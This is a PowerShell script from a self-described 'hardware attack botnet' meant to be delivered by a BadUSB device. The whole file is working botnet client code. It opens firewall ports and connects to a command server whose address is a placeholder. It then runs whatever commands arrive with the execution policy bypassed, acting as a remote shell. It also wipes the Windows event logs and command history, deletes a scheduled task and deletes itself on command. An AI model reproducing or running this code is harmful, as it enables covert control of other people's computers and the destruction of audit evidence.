<#
  Goose Net
  Goose net is an open source hardware attack botnet written in c#/processing
  and is used in conjunction with a bad usb at_tiny85 arduino usb keyboard emulator for use in a penetration
  testing environment.
  
  GNU General Public License (GPL) version 3
  
  Copyright (c) 2023 Anthony Logan Mitchell
  
  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  (at your option) any later version.
  
  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
  GNU General Public License for more details.
  
  You should have received a copy of the GNU General Public License
  along with this program. If not, see <https://www.gnu.org/licenses/>.
 #>

if (!$(Get-NetFirewallRule -DisplayName "rs1in" 2>$null)) {
	New-NetFirewallRule -DisplayName "rs1in" -Direction Inbound -LocalPort <OS_PORT> -Protocol TCP -Action Allow
} 

if (!$(Get-NetFirewallRule -DisplayName "rs1out" 2>$null)) {
	New-NetFirewallRule -DisplayName "rs1out" -Direction Outbound -LocalPort <OS_PORT> -Protocol TCP -Action Allow
} 

try {
	$client = New-Object System.Net.Sockets.TCPClient("<SLAVE_SERVER_DOMAIN>", <OS_PORT>);
	$client.ReceiveTimeout = 5000;
	$stream = $client.GetStream();
	$writer = New-Object System.IO.StreamWriter($stream);
	$reader = New-Object System.IO.StreamReader($stream);
	$writer.WriteLine("startup");
	$writer.Flush();
	$cmd_buff = [char[]]::new(2048)
	$exit = 0;
	$reading = $false
	$terminate = $false;
	while ($exit -eq 0) {
		if($client.Client.Poll(5000000,[System.Net.Sockets.SelectMode]::SelectRead) -eq $true) {
			if ($client.Client.Available -eq 0) {
				Write-Output "Connection to server lost";
				$exit = 1;
			} else {
				$client_stream = $client.GetStream();
				$client_reader = New-Object System.IO.StreamReader($client_stream);
				$client_writer = New-Object System.IO.StreamWriter($client_stream);
				

				while ($client_reader.Peek() -ge 0) {		
					$cmd_buff = $client_reader.ReadLine();
					$launch = $cmd_buff -join ""

					if ($launch -ne "slave established") {
						if ($launch -match "^cd (.*)") {
							cd $Matches[1];
							$client_writer.WriteLine("Directory changed.");
							$client_writer.Flush();
						} elseif ($launch -match "--client_shutdown") {
							$client_writer.WriteLine("slave shut down");
							$client_writer.Flush();
							$client.Close();
							$exit = 1;
						} elseif ($launch -match "--log_wipe") {
							Clear-EventLog -LogName 'Windows PowerShell';
							Clear-EventLog -LogName Application;
							Clear-EventLog -LogName Security;
							Clear-EventLog -LogName System;
							Clear-History
							Remove-Item (Get-PSReadlineOption).HistorySavePath
							$client_writer.WriteLine("Logs Wiped.");
							$client_writer.Flush();
						} elseif ($launch -match "--kill_switch") {
							$client_writer.WriteLine("client terminated.");
							$client_writer.Flush();
							#Unschedule task
							C:\Windows\System32\schtasks.exe /Delete /TN rs-task /f
							#Clear event logs on machine.
							Clear-EventLog -LogName 'Windows PowerShell';
							Clear-EventLog -LogName Application;
							Clear-EventLog -LogName Security;
							Clear-EventLog -LogName System;
							Clear-History
							Remove-Item (Get-PSReadlineOption).HistorySavePath
							$terminate = $true;
		     				$client.Close();
							$exit = 1;
						} else {							
							foreach ($line in (powershell.exe -ExecutionPolicy Bypass -command $launch | Out-String -Stream) ) {
								#Write-Output $line;
								$client_writer.WriteLine($line);

							}	
							$client_writer.WriteLine("command complete.");
							$client_writer.Flush();						
						}
					}
				}
			}				
		} 
	}
}
catch {
	Write-Output $_;
}

if ($terminate -eq $true) {
	Remove-Item $script:MyInvocation.MyCommand.Path -Force;
}

